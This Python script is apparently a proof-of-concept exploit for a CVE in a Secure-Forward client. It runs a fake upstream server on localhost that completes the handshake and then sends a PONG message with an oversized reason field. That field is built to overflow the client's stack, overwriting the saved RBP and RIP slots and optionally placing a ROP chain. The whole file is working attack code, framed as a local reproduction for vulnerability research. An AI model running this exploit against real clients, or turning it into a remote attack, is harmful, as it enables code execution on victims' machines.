#!/usr/bin/env python3
"""Malicious Secure-Forward upstream for CVE-2026-61674 live-wire repro.

Binds ONLY 127.0.0.1. Speaks the unencrypted Secure-Forward handshake:
  ->  server sends ["HELO", {"nonce": <bin 16>}]
  <-  victim sends PING (read, ignored)
  ->  server sends ["PONG", false, <reason>, "h", "d"]

No shared-key computation is needed: the vulnerable client verifies the
PING hash itself but secure_forward_pong() verifies nothing about the PONG.
"""
import argparse
import socket
import struct
import time

MARKERS = {0: 0x41, 17: 0x5A, 24: 0x7A, 33: 0x3C,
           40: 0x7B, 63: 0x41}
SAVED_RBP_OFF = 48
SAVED_RIP_OFF = 56


def write_u64(buf, off, value):
    """Place a little-endian 64-bit frame slot; value must be canonical."""
    if not (value < (1 << 47) or (1 << 63) - (1 << 47) <= value < (1 << 64)):
        raise ValueError('non-canonical address 0x%x' % value)
    buf[off:off + 8] = struct.pack('<Q', value)




def mp_hdr(base, limit, n):
    """Fix-width (base|n) header for n < limit, else str8/16 equivalent."""
    if n < limit:
        return bytes([base | n])
    if n < 256:
        return b'\xd9' + bytes([n]) if base == 0xA0 else b'\xcc' + bytes([n])
    return b'\xda' + struct.pack('>H', n) if base == 0xA0 else b'\xcd' + struct.pack('>H', n)


def mp_str(s):
    b = s if isinstance(s, bytes) else s.encode()
    return mp_hdr(0xA0, 32, len(b)) + b


def mp_bin(b):
    if len(b) < 256:
        return b'\xc4' + bytes([len(b)]) + b
    return b'\xc5' + struct.pack('>H', len(b)) + b


def mp_array(items):
    n = len(items)
    hdr = bytes([0x90 | n]) if n < 16 else b'\xdc' + struct.pack('>H', n)
    return hdr + b''.join(items)


def mp_map(pairs):
    n = len(pairs)
    hdr = bytes([0x80 | n]) if n < 16 else b'\xde' + struct.pack('>H', n)
    return hdr + b''.join(k + v for k, v in pairs)


def reason_bytes(size, markers, saved_rbp=None, saved_rip=None, rop=None):
    out = bytearray(b'A' * size)
    for off, val in markers.items():
        if off < size:
            out[off] = val
    if saved_rbp is not None:
        write_u64(out, SAVED_RBP_OFF, saved_rbp)
    if saved_rip is not None:
        write_u64(out, SAVED_RIP_OFF, saved_rip)
    if rop is not None:
        blob = bytes.fromhex(''.join(rop.split()))
        if SAVED_RIP_OFF + len(blob) > size:
            raise ValueError('ROP payload does not fit in reason')
        out[SAVED_RIP_OFF:SAVED_RIP_OFF + len(blob)] = blob
    return bytes(out)







def helo():
    return mp_array([mp_str('HELO'),
                     mp_map([(mp_str('nonce'), mp_bin(b'N' * 16))])])


def pong(reason, authorized):
    return mp_array([mp_str('PONG'),
                     b'\xc3' if authorized else b'\xc2',
                     mp_str(reason), mp_str('h'), mp_str('d')])


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--port', type=int, required=True)
    ap.add_argument('--size', type=int, default=1000)
    ap.add_argument('--authorized', action='store_true')
    ap.add_argument('--short', action='store_true')
    ap.add_argument('--rbp', type=lambda s: int(s, 0), default=None,
                    help='canonical 64-bit value for saved-RBP slot (offset 48)')
    ap.add_argument('--rip', type=lambda s: int(s, 0), default=None,
                    help='canonical 64-bit value for saved-RIP slot (offset 56)')
    ap.add_argument('--rop', default=None,
                    help='hex bytes written raw from offset 56 (ROP chain/string)')
    ap.add_argument('--wait-ping', type=float, default=4.0)

    args = ap.parse_args()

    reason = (b'safe' if args.short else
              reason_bytes(args.size, MARKERS, args.rbp, args.rip, args.rop))


    payload = pong(reason, args.authorized)
    hello = helo()
    print('SERVER port=%d reason_len=%d pong_len=%d rbp=%s rip=%s helo_hex=%s'
          % (args.port, len(reason), len(payload),
             hex(args.rbp) if args.rbp is not None else '-',
             hex(args.rip) if args.rip is not None else '-',
             hello.hex()), flush=True)


    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('127.0.0.1', args.port))
    srv.listen(1)
    srv.settimeout(30)
    conn, addr = srv.accept()
    conn.settimeout(args.wait_ping)
    print('SERVER accepted %s:%d' % addr, flush=True)
    try:
        conn.sendall(hello)
        print('SERVER sent HELO', flush=True)
        try:
            data = conn.recv(4096)
            print('SERVER got bytes=%d hex=%s' % (len(data), data[:80].hex()),
                  flush=True)
        except socket.timeout:
            print('SERVER PING timeout (continuing)', flush=True)
        conn.sendall(payload)
        print('SERVER sent PONG len=%d head=%s'
              % (len(payload), payload[:40].hex()), flush=True)
        time.sleep(3)
    finally:
        conn.close()
        srv.close()


if __name__ == '__main__':
    main()
